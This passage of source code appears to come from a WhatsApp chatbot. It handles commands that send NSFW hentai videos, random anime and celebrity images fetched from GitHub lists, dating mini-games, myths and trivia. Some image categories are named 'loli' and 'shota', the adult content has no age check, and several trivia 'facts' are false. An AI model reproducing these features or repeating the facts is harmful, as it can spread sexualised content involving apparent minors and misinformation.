				buttonText: { displayText: "📜 Back to Menu" }
			}
		],
		viewOnce: true
	});
	db.data.users[m.sender].limit -= 1;
}
break;

case 'hentai': 
case 'hentai-video': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!isPremium) return newReply(mess.premium);
	await m.react('⏱️');
	const result = await hentai();
	m.reply({
		video: { url: result[0].video_1 },
		caption: `⚠️ *NSFW Content Detected!* ⚠️\n\nHi, Kak! Remember, this content is intended for users of appropriate age and must be used with full awareness. Don't forget time and responsibilities because of this content! 🕒💡\n\nIf you start feeling too into it, take a break. Mental and physical health come first! 🌟`,
		footer: footer,
		buttons: [
			{
				buttonId: prefix + command,
				buttonText: { displayText: "🔄 Next Again" }
			},
			{
				buttonId: `${prefix}menu`,
				buttonText: { displayText: "📜 Back to Menu" }
			}
		],
		viewOnce: true
	});
	db.data.users[m.sender].limit -= 1;
}
break;

case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'Husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	let data
	if (/akira/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/akira.json')
	if (/akiyama/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/akiyama.json')
	if (/ana/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/ana.json')
	if (/art/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/art.json')
	if (/asuna/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/asuna.json')
	if (/ayuzawa/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/ayuzawa.json')
	if (/boneka/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/boneka.json')
	if (/boruto/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/boruto.json')
	if (/bts/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/bts.json')
	if (/cecan/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/cecan.json')
	if (/chiho/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/chiho.json')
	if (/chitoge/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/chitoge.json')
	if (/cogan/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/cogan.json')
	if (/cosplay/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/cosplay.json')
	if (/cosplayloli/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/cosplayloli.json')
	if (/cosplaysagiri/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/cosplaysagiri.json')
	if (/cyber/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/cyber.json')
	if (/deidara/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/deidara.json')
	if (/doraemon/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/doraemon.json')
	if (/eba/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/eba.json')
	if (/elaina/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/elaina.json')
	if (/emilia/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/emilia.json')
	if (/erza/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/erza.json')
	if (/exo/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/exo.json')
	if (/femdom/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/femdom.json')
	if (/freefire/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/freefire.json')
	if (/gamewallpaper/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/gamewallpaper.json')
	if (/glasses/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/glasses.json')
	if (/gremory/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/gremory.json')
	if (/hacker/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/hekel.json')
	if (/hestia/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/hestia.json')
	if (/Husbu/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/Husbu.json')
	if (/inori/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/inori.json')
	if (/islamic/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/islamic.json')
	if (/isuzu/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/isuzu.json')
	if (/itachi/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/itachi.json')
	if (/itori/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/itori.json')
	if (/jennie/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/jeni.json')
	if (/jiso/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/jiso.json')
	if (/justina/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/justina.json')
	if (/kaga/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/kaga.json')
	if (/kagura/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/kagura.json')
	if (/kakasih/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/kakasih.json')
	if (/kaori/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/kaori.json')
	if (/cartoon/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/kartun.json')
	if (/shortquote/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/kataNya.json')
	if (/keneki/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/keneki.json')
	if (/kotori/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/kotori.json')
	if (/kpop/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/kpop.json')
	if (/kucing/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/kucing.json')
	if (/kurumi/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/kurumi.json')
	if (/lisa/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/lisa.json')
	if (/loli2/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/loli.json')
	if (/madara/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/madara.json')
	if (/megumin/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/megumin.json')
	if (/mikasa/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/mikasa.json')
	if (/mikey/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/mikey.json')
	if (/miku/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/miku.json')
	if (/minato/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/minato.json')
	if (/mobile/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/mobil.json')
	if (/motor/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/motor.json')
	if (/mountain/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/mountain.json')
	if (/naruto/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/naruto.json')
	if (/nekonime/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/nekonime.json')
	if (/nezuko/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/nezuko.json')
	if (/onepiece/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/onepiece.json')
	if (/pentol/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/pentol.json')
	if (/pokemon/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/pokemon.json')
	if (/profil/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/profil.json')
	if (/progamming/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/programming.json')
	if (/pubg/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/pubg.json')
	if (/randblackpink/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/randblackpink.json')
	if (/randomnime/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/randomnime.json')
	if (/randomnime2/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/randomnime2.json')
	if (/rize/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/rize.json')
	if (/rose/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/rose.json')
	if (/ryujin/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/ryujin.json')
	if (/sagiri/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/sagiri.json')
	if (/sakura/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/sakura.json')
	if (/sasuke/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/sasuke.json')
	if (/satanic/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/satanic.json')
	if (/shina/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/shina.json')
	if (/shinka/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/shinka.json')
	if (/shinomiya/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/shinomiya.json')
	if (/shizuka/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/shizuka.json')
	if (/shota/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/shota.json')
	if (/space/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/tatasurya.json')
	if (/technology/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/technology.json')
	if (/tejina/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/tejina.json')
	if (/toukachan/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/toukachan.json')
	if (/tsunade/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/tsunade.json')
	if (/waifu2/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/waifu.json')
	if (/wallhp/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/wallhp.json')
	if (/wallml/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/wallml.json')
	if (/wallmlnime/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/wallnime.json')
	if (/yotsuba/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/yotsuba.json')
	if (/yuki/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/yuki.json')
	if (/yulibocil/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/yulibocil.json')
	if (/yumeko/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/Ghifaryz/Media/master/yumeko.json')
	const result = data[Math.floor(Math.random() * data.length)]
	const buffer = await getBuffer(result);
	m.reply({
		image: buffer,
		caption: `Here you go Kak ${pushname}, ${command} 😋☕`,
		footer: footer,
		buttons: [
			{
				buttonId: prefix + command,
				buttonText: {
					displayText: "🔄 Next Again"
				}
			},
			{
				buttonId: `${prefix}menu`,
				buttonText: {
					displayText: "📜 Back to Menu"
				}
			}
		],
		viewOnce: true
	});
};
db.data.users[m.sender].limit -= 1;
break;

	case 'sound1': case 'sound2': case 'sound3': case 'sound4': case 'sound5': case 'sound6': case 'sound7': case 'sound8': case 'sound9': case 'sound10': case 'sound11': case 'sound12': case 'sound13': case 'sound14': case 'sound15': case 'sound16': case 'sound17': case 'sound18': case 'sound19': case 'sound20': case 'sound21': case 'sound22': case 'sound23': case 'sound24': case 'sound25': case 'sound26': case 'sound27': case 'sound28': case 'sound29': case 'sound30': case 'sound31': case 'sound32': case 'sound33': case 'sound34': case 'sound35': case 'sound36': case 'sound37': case 'sound38': case 'sound39': case 'sound40': case 'sound41': case 'sound42': case 'sound43': case 'sound44': case 'sound45': case 'sound46': case 'sound47': case 'sound48': case 'sound49': case 'sound50': case 'sound51': case 'sound52': case 'sound53': case 'sound54': case 'sound55': case 'sound56': case 'sound57': case 'sound58': case 'sound59': case 'sound60': case 'sound61': case 'sound62': case 'sound63': case 'sound64': case 'sound65': case 'sound66': case 'sound67': case 'sound68': case 'sound69': case 'sound70': case 'sound71': case 'sound72': case 'sound73': case 'sound74': case 'sound75': case 'sound76': case 'sound77': case 'sound78': case 'sound79': case 'sound80': case 'sound81': case 'sound82': case 'sound83': case 'sound84': case 'sound85': case 'sound86': case 'sound87': case 'sound88': case 'sound89': case 'sound90': case 'sound91': case 'sound92': case 'sound93': case 'sound94': case 'sound95': case 'sound96': case 'sound97': case 'sound98': case 'sound99': case 'sound100': case 'sound101': case 'sound102': case 'sound103': case 'sound104': case 'sound105': case 'sound106': case 'sound107': case 'sound108': case 'sound109': case 'sound110': case 'sound111': case 'sound112': case 'sound113': case 'sound114': case 'sound115': case 'sound116': case 'sound117': case 'sound118': case 'sound119': case 'sound120': case 'sound121': case 'sound122': case 'sound123': case 'sound124': case 'sound125': case 'sound126': case 'sound127': case 'sound128': case 'sound129': case 'sound130': case 'sound131': case 'sound132': case 'sound133': case 'sound134': case 'sound135': case 'sound136': case 'sound137': case 'sound138': case 'sound139': case 'sound140': case 'sound141': case 'sound142': case 'sound143': case 'sound144': case 'sound145': case 'sound146': case 'sound147': case 'sound148': case 'sound149': case 'sound150': case 'sound151': case 'sound152': case 'sound153': case 'sound154': case 'sound155': case 'sound156': case 'sound157': case 'sound158': case 'sound159': case 'sound160': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	const aud = await getBuffer(`https://github.com/Ghifaryz/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
	await sock.sendMessage(m.chat, { audio: aud, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
db.data.users[m.sender].limit -= 1;
break;

case 'jadian': {
	if (!m.isGroup) return newReply(mess.group);
	sock.jadian = sock.jadian ? sock.jadian : {};
	let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");

	if (!user) return newReply(`Kak, tag or reply to someone first so I know who you mean! 😉\n\n*Send command*: ${prefix + command} @0`);
	if (user === m.sender) return newReply("Hmm... are you trying to date yourself? 😏 Find a real partner, Kak!");
	if (user === botNumber) return newReply("Eh, Kak, I'm just a bot... I can't date you 😣 Find a human instead!");

	let pasangan = db.data.users[user].pacar;
	let pasang = db.data.users[m.sender].pacar;

	if (pasang === user) {
		newReply(`What, Kak, you're already dating them and still asking again? 🙄 Be faithful!");
	} else if (pasangan) {
		newReply(`Oops, Kak... they're already taken 🥲\nTry asking @${pasangan.split("@")[0]}, maybe they'll allow it! 🫣`);
	} else if (pasang) {
		newReply(`Caught trying to cheat, huh?! 😱\n@${pasang.split("@")[0]}, look at your partner's behavior 🤭`);
	} else {
		let kataNembak = [
			"There are times when I don't like being alone. But I also don't want everyone to accompany me, only you I want.",
			"I just realized you're actually rich! Rich in what I've been looking for all this time. Do you want to be my girlfriend/boyfriend?",
			"Can I send my CV to you? Because I want to apply to be your partner.",
			"If you're a flower, I want to be the bee. Always coming and never wanting to be far from you. Want to be my partner?",
			"Simple... I like you. Do you like me? 😳"
		];
		let kataNya = await pickRandom(kataNembak);
		let teks = `💌 *Love Message...* 💌\n\n@${m.sender.split("@")[0]} ❤️ @${user.split("@")[0]}\n\n"${kataNya}"`;

		sock.jadian[user] = [
			m.reply({
				text: teks,
				footer: botName,
				buttons: [
					{
						buttonId: ".terima",
						buttonText: { displayText: "Accept ❤️" }
					},
					{
						buttonId: ".tolak",
						buttonText: { displayText: "Reject ❌" }
					}
				],
				viewOnce: true
			}),
			m.sender
		];
		newReply(`Yayy, @${m.sender.split("@")[0]} just asked @${user.split("@")[0]} to be in a relationship! 🥰\n\n@${user.split("@")[0]}, please choose~ ❤️`);
	}
}
break;

case 'terima': {
	if (!m.isGroup) return newReply(mess.group);
	if (sock.jadian[m.sender]) {
		let user = sock.jadian[m.sender][1];
		db.data.users[user].pacar = m.sender;
		db.data.users[m.sender].pacar = user;
		newReply(`🎉🎉 Congratulations!!! 🎉🎉\n\n@${m.sender.split("@")[0]} is now officially in a relationship with\n❤️ @${user.split("@")[0]}!\n\nI'm so happy for you! May it last forever~ Don't forget to invite me when you get married! 🙈💕`);
		delete sock.jadian[m.sender];
	} else {
		newReply("Eh Kak, no one's confessing to you, who do you want to accept? 😅");
	}
}
break;

case 'tolak': {
	if (!m.isGroup) return newReply(mess.group);
	if (sock.jadian[m.sender]) {
		let user = sock.jadian[m.sender][1];
		newReply(`Oh no, poor @${user.split("@")[0]} got rejected by you 😓\n\nBut don't be sad, Kak! Maybe tomorrow there's someone better and more suitable for you! ❤️`);
		delete sock.jadian[m.sender];
	} else {
		newReply("Eh Kak, no one's confessing to you. Don't be delusional 🤭");
	}
}
break;

case 'putus': {
	if (!m.isGroup) return newReply(mess.group);
	let pasangan = db.data.users[m.sender].pacar;
	if (pasangan) {
		db.data.users[m.sender].pacar = "";
		db.data.users[pasangan].pacar = "";
		newReply(`💔 *BREAKING NEWS* 💔\n\n@${m.sender.split("@")[0]} and @${pasangan.split("@")[0]} have officially broken up... 😢\n\nDon't be sad! Sometimes breaking up isn't the end of everything, but the beginning of something better. Stay strong! 💪`);
	} else {
		newReply("Kak, you're single... Who do you want to break up with? 🤨 You're something else!");
	}
}
break;

case 'cekpacar': {
	if (!m.isGroup) return newReply(mess.group);
	try {
		let user = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : "");
		if (!user) return newReply(`Tag or reply to someone first, Kak! 😅\n\n*Send command*: ${prefix + command} @0`);
		let pasangan = db.data.users[user].pacar;
		if (pasangan) {
			newReply(`💑 *Love Status Update* 💑\n\n@${user.split("@")[0]} already has a partner!\n❤️ Their partner is @${pasangan.split("@")[0]} 😍\n\nSomeone's in love~ 🥰`);
		} else {
			newReply(`😱 *Breaking News!* 😱\n\nOh, turns out @${user.split("@")[0]} is still single! 🤭\n\nWho wants to sign up to be their partner? 🎤`);
		}
	} catch (error) {
		newReply(`Hmm... seems like @${user.split("@")[0]} isn't in the database 😥`);
	}
}
break;

case 'checkme':{
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	let namaTarget = args.join(" ");
	let idPengirim = `${m.sender}`;
	const daftarSifat = ['Kind 🥰', 'Sassy 😤', 'Relaxed 😎', 'Friendly 😊', 'Funny 🤭', 'Annoying 😜', 'Serious 🧐', 'Cool 😌'];
	const daftarHobi = ['Cooking 🍳', 'Dancing 💃', 'Gaming 🎮', 'Drawing 🎨', 'Reading 📚', 'Watching Anime 📺', 'Singing 🎤', 'Gardening 🌱'];
	const tingkatBucin = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
	const tingkatKeren = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
	const ketampanan = ['Yes 😍', 'No 😭', 'Very Handsome 🤩', 'Hmm... Just average 😅'];
	const daftarWatak = ['Loving 💖', 'Angry 😡', 'Generous 🤗', 'Patient 🧘', 'Funny 🤭', 'Serious 🧐'];
	const moralBaik = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
	const moralBuruk = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
	const tingkatKepintaran = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
	const tingkatKeberanian = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
	const tingkatKetakutan = Array.from({ length: 100 }, (_, i) => (i + 1).toString());
	let sifatAcak = daftarSifat[Math.floor(Math.random() * daftarSifat.length)];
	let hobiAcak = daftarHobi[Math.floor(Math.random() * daftarHobi.length)];
	let bucinAcak = tingkatBucin[Math.floor(Math.random() * tingkatBucin.length)];
	let kerenAcak = tingkatKeren[Math.floor(Math.random() * tingkatKeren.length)];
	let tampanAcak = ketampanan[Math.floor(Math.random() * ketampanan.length)];
	let watakAcak = daftarWatak[Math.floor(Math.random() * daftarWatak.length)];
	let moralBaikAcak = moralBaik[Math.floor(Math.random() * moralBaik.length)];
	let moralBurukAcak = moralBuruk[Math.floor(Math.random() * moralBuruk.length)];
	let pintarAcak = tingkatKepintaran[Math.floor(Math.random() * tingkatKepintaran.length)];
	let beraniAcak = tingkatKeberanian[Math.floor(Math.random() * tingkatKeberanian.length)];
	let takutAcak = tingkatKetakutan[Math.floor(Math.random() * tingkatKetakutan.length)];
	let profil = `*🎀━━━〔 Check @${idPengirim.split('@')[0]} 〕━━━🎀*\n\n📝 *Name*: ${pushname}\n✨ *Characteristics*: ${sifatAcak}\n🎯 *Hobby*: ${hobiAcak}\n❤️ *Bucin Level*: ${bucinAcak}%\n🌟 *Coolness Level*: ${kerenAcak}%\n😎 *Handsomeness*: ${tampanAcak}\n🧠 *Character*: ${watakAcak}\n💎 *Good Morals*: ${moralBaikAcak}%\n🔥 *Bad Morals*: ${moralBurukAcak}%\n📊 *Intelligence*: ${pintarAcak}%\n🛡️ *Bravery*: ${beraniAcak}%\n👻 *Fear*: ${takutAcak}%\n\n*🍭━━━〔 CHECK PROPERTIES 〕━━━🍭*`;
	try {
		ppuser = await sock.profilePictureUrl(m.sender, 'image');
	} catch (err) {
		ppuser = imageUrl
	}	
	let fotoProfil = await getBuffer(ppuser);
	sock.sendMessage(
		m.chat, 
		{ image: fotoProfil, caption: profil, mentions: [idPengirim] },
		{ quoted: m }
	);
}
db.data.users[m.sender].limit -= 1;
break;

case 'mitos': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	const myths = [
		'🌕 *Full Moon Myth*: Many believe the full moon can affect human behavior, causing madness and increasing crime rates.',
		'🪞 *Broken Mirror Myth*: Breaking a mirror is believed to bring 7 years of bad luck.',
		'👻 *Ghost in Banyan Tree Myth*: Banyan trees are often associated with supernatural beings and believed to be haunted.',
		'🐈‍⬛ *Black Cat Myth*: Seeing a black cat cross your path is often considered bad luck.',
		'💍 *Ring on Middle Finger Myth*: Wearing a ring on the middle finger is believed to attract positive energy and luck.',
		'🧂 *Spilling Salt Myth*: Spilling salt is believed to bring bad luck unless thrown over the left shoulder.',
		'🔮 *Crystal Ball Myth*: Crystal balls are often associated with fortune-telling abilities.',
		'🎋 *Bamboo Tree Myth*: Bamboo trees in the yard are believed to attract positive energy and bring good luck.',
		'🌠 *Shooting Star Myth*: If you see a shooting star and make a wish, it will come true.',
		'🐦 *Bird Entering House Myth*: A bird entering a house is often seen as a sign of visitors or important news.',
		'🌧️ *Rain on Wedding Day Myth*: Rain on a wedding day is often considered a sign of luck and happiness.',
	'🍃 *Falling Leaf on Head Myth*: If a leaf falls on someone's head, it's believed that person will receive good luck.',
'🦉 *Owl Myth*: Owls are often considered as symbols of death or bad omens in some cultures.',
'🖤 *Black Color Myth*: The color black is often associated with misfortune and negative energy.',
'🌈 *End of the Rainbow Myth*: Legend has it that there's treasure at the end of the rainbow, but no one can reach it.',
'🌺 *Flowers Growing on Grave Myth*: Flowers thriving on a grave are believed to be a sign that the buried person's spirit is at peace.',
'🏰 *Haunted Castle Myth*: Many old castles in Europe are believed to be haunted by spirits of past inhabitants.',
'💤 *Dream of Teeth Falling Out Myth*: Dreaming of teeth falling out is often considered a sign of impending death in the family.',
'🌜 *Counting Stars Myth*: Counting stars in the sky is believed to cause someone to grow pimples.',
'🍀 *Four-Leaf Clover Myth*: Finding a four-leaf clover is believed to bring good luck.',
'🔥 *Self-Igniting Fire Myth*: Fire that suddenly ignites at night is often associated with the presence of spirits.',
'🎵 *Whistling at Night Myth*: Whistling at night is believed to attract supernatural beings.',
'🦎 *Lizard Falling on Head Myth*: If a lizard falls on someone's head, it's believed to be a bad omen.',
'🌺 *Night-Blooming Jasmine Myth*: The fragrance of night-blooming jasmine is often considered a sign of supernatural presence.',
'🪦 *New Grave Myth*: Visiting a newly made grave at night is believed to bring negative energy.',
'🧟 *Zombie in Haiti Myth*: In Haitian Voodoo belief, there's a myth about humans being resurrected as zombies by witches.',
'🌟 *Mysterious Lights at Night Myth*: Strange lights seen at night are often considered wandering spirits.',
'🏞️ *Haunted Lake Myth*: Many lakes worldwide are believed to be inhabited by guardian spirits or mythical creatures.',
'🪶 *White Feather Myth*: Finding a white feather is believed to be a sign that angels are watching over us.',
'🍃 *Sudden Strong Wind Myth*: Sudden strong winds are often considered a sign of supernatural presence.',
'🎭 *Haunted Mask Myth*: Some traditional masks are believed to possess strong spirits or mystical energy.',
'🗿 *Ancient Statue Myth*: Ancient statues are often believed to contain spirits or curses.',
'⚰️ *Moving Coffin Myth*: There's a myth in some cultures that coffins can move on their own if there's an unsettled spirit.',
'🔔 *Self-Ringing Bell Myth*: If a bell rings by itself without wind or anyone striking it, it's often considered a sign of a spirit trying to communicate.'
];
const randomMyth = myths[Math.floor(Math.random() * myths.length)];
newReply(`🪄 *Interesting Myth*\n\n${randomMyth}`);
db.data.users[m.sender].limit -= 1;
break;
}

case 'unique facts': {
if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
const facts = [
'🧠 The human brain can generate enough electricity to power a small light bulb!',
'🐼 Pandas can spend about 12 hours a day just eating bamboo.',
'🌕 On the moon, human footprints can last for millions of years because there's no wind or rain.',
'🦄 Giraffes sleep only about 10-30 minutes per day and often sleep standing up!',
'🎵 Music can improve mood and help reduce stress.',
'🐢 Turtles have existed since the dinosaur era, around more than 200 million years ago.',
'🍫 Chocolate can trigger endorphin hormones that make someone feel happy.',
'🚀 In space, tears can't fall due to low gravity!',
'🔮 More than 70% of the Earth's surface is covered by water.',
'🐝 Bees can recognize human faces just like humans recognize each other's faces.',
'🐧 Penguins are the only birds that can swim but cannot fly.',
'🦷 Teeth are the only part of the human body that cannot repair themselves.',
'🐌 Snails can sleep for up to 3 years!',
'🔑 Koala fingerprints are very similar to human fingerprints.',
'🌍 Earth is the only planet not named after a god or goddess.',
'🐟 Goldfish have better memory than people think, they can remember things for several months.',
'🦇 Bats are the only mammals that can fly.',
'🎤 The human heart beats about 100,000 times a day.',
'🌈 No two rainbows are exactly the same, each person sees a rainbow from a different perspective.',
'📱 More people in the world have access to mobile phones than clean toilets.',
'🌋 In Iceland, there are over 100 active volcanoes.',
'💧 Hot water can freeze faster than cold water under certain conditions (Mpemba Effect).',
'⚡ Lightning is hotter than the surface of the sun.',
'🦩 Flamingos get their pink color from the food they eat, which is shrimp.',
'🐇 Rabbits cannot vomit.',
'🧊 Antarctica is the largest desert in the world even though it's covered in ice.',
'🐜 Ants have no lungs, they breathe through small pores in their bodies.',
'🌟 The light from stars we see may no longer exist because those stars could have already died.',
'🕷️ Spiders can produce silk stronger than steel of the same weight.',
'🐨 Koalas sleep up to 20 hours a day.',
'🦁 Lionesses hunt more often than male lions.',
'🐍 Snakes can sleep with their eyes open because they have no eyelids.',
'🧠 The human brain is about 75% water.',
'🐦 Hummingbirds are the only birds that can fly backwards.',
'🎮 Playing video games can improve hand-eye coordination.',
'📖 People who read books regularly tend to be more empathetic and better at understanding others' feelings.',
'🎭 Laughing can boost the immune system.',
'🌠 On average, there are 44 lightning strikes hitting the Earth's surface every second.',
